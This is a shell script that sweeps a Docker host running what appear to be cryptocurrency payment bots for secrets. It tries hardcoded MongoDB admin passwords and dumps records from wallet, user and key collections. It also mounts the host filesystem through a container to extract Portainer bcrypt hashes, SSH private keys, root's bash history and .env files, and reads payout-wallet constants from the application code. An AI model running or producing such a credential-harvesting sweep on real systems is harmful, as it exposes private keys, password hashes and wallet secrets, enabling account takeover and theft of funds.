#!/bin/sh
echo "=== V2 BUILD META ==="; date -u
echo "=== DOCKER PS ==="; docker ps -a --format '{{.Names}} | {{.Image}} | {{.Status}}'
echo "=== MONGO CONTAINER ==="
docker inspect mongodb-bots --format '{{json .Mounts}}' 2>/dev/null
docker exec mongodb-bots sh -c 'command -v mongosh; command -v mongo; ls /usr/bin | grep -i mongo | head' 2>&1 | head -10
echo "=== MONGO DBS admin123 ==="
docker exec mongodb-bots sh -c 'if command -v mongosh >/dev/null; then M=mongosh; else M=mongo; fi; $M --quiet -u admin -p admin123 --authenticationDatabase admin --eval "JSON.stringify(db.adminCommand({listDatabases:1}).databases.map(d=>d.name))"' 2>&1 | head -20
echo "=== MONGO DBS Andrea123 ==="
docker exec mongodb-bots sh -c 'if command -v mongosh >/dev/null; then M=mongosh; else M=mongo; fi; $M --quiet -u admin -p Andrea123 --authenticationDatabase admin --eval "JSON.stringify(db.adminCommand({listDatabases:1}).databases.map(d=>d.name))"' 2>&1 | head -20
echo "=== MONGO COLLECTIONS+COUNTS ==="
docker exec mongodb-bots sh -c 'if command -v mongosh >/dev/null; then M=mongosh; else M=mongo; fi; $M --quiet -u admin -p admin123 --authenticationDatabase admin --eval "db.adminCommand({listDatabases:1}).databases.forEach(function(d){ if(d.name==\"admin\"||d.name==\"local\"||d.name==\"config\")return; var x=db.getSiblingDB(d.name); var cs=x.getCollectionNames(); print(\"DB \"+d.name+\" cols=\"+cs.join(\",\")); cs.slice(0,25).forEach(function(c){print(\"  \"+c+\" count=\"+x.getCollection(c).countDocuments())}) })"' 2>&1 | head -120
echo "=== MONGO SAMPLE wallets/users ==="
docker exec mongodb-bots sh -c 'if command -v mongosh >/dev/null; then M=mongosh; else M=mongo; fi; $M --quiet -u admin -p admin123 --authenticationDatabase admin --eval "db.adminCommand({listDatabases:1}).databases.forEach(function(d){ if([\"admin\",\"local\",\"config\"].indexOf(d.name)>=0)return; var x=db.getSiblingDB(d.name); var cs=x.getCollectionNames(); cs.forEach(function(c){ if(/wallet|user|account|private|key|order|deposit/i.test(c)){ print(\"### \"+d.name+\".\"+c); printjson(x.getCollection(c).find().limit(2).toArray()) } }) })"' 2>&1 | head -200
echo "=== PORTAINER USERS ==="
docker run --rm -v /:/host:ro alpine sh -c '
  for f in $(find /host/var/lib/docker/volumes -maxdepth 3 -name "portainer.db" 2>/dev/null); do
    echo "FILE $f"; ls -la "$f"
    echo GREP_BCRYPT
    grep -ao "[\$]2[abxy][\$][0-9][0-9][\$][./A-Za-z0-9]\{40,\}" "$f" | head -6
    echo USER_OFFSETS
    grep -aob "Username" "$f" | head -6
    for off in $(grep -aob "Username" "$f" | head -6 | cut -d: -f1); do
      echo "--- window at $off"
      dd if="$f" bs=1 skip=$((off-120)) count=520 2>/dev/null | tr -c "[:print:]" " " | head -c 700; echo
    done
  done
' 2>&1 | head -140
echo "=== HOST SECRETS SWEEP ==="
docker run --rm -v /:/host:ro alpine sh -c '
  echo SSH_DIRS
  ls -la /host/root/.ssh /host/home/*/.ssh 2>/dev/null | head -40
  echo SSH_KEYS
  for f in /host/root/.ssh/id_* /host/root/.ssh/authorized_keys /host/home/*/.ssh/id_* 2>/dev/null; do [ -f "$f" ] && { echo "--- $f"; head -c 1200 "$f"; echo; }; done
  echo BASH_HISTORY_TAIL
  tail -80 /host/root/.bash_history 2>/dev/null
  echo ALL_ENV_FILES
  find /host/opt /host/root /host/home /host/srv -maxdepth 5 -name ".env" 2>/dev/null | head -60
  echo ENV_KEYS
  grep -rhoE "^[A-Za-z0-9_]+=" $(find /host/opt /host/root /host/home /host/srv -maxdepth 5 -name ".env" 2>/dev/null | head -40) 2>/dev/null | sort -u | head -120
' 2>&1 | head -220
echo "=== CAJERO/PAYOUT CONSTANTS ==="
docker exec ebot-fastapi sh -c 'grep -rn "CAJERO_WALLET" /app/*.py | head -10; echo ---; grep -n "MASTER_WALLET\s*=\|CAJERO_BAND\|TRONIFY\|FEEE_WALLET\|TRONENERGIZE" /app/*.py | head -20' 2>&1 | head -60
echo "=== send_payment_API_wallets2 BODY ==="
docker exec ebot-fastapi sh -c 'n=$(grep -rn "def send_payment_API_wallets2" /app/*.py | head -1 | cut -d: -f2); f=$(grep -rln "def send_payment_API_wallets2" /app/*.py | head -1); echo F=$f N=$n; [ -n "$n" ] && sed -n "${n},$((n+60))p" "$f"' 2>&1 | head -90
echo "=== TG BOT V2 ENV ==="
docker run --rm -v /:/host:ro alpine sh -c 'cat /host/opt/brutus/Telegram-bot-v2/.env 2>/dev/null | head -c 6000; echo; echo ---; ls /host/opt/brutus 2>/dev/null' 2>&1 | head -80
echo "=== DONE ==="
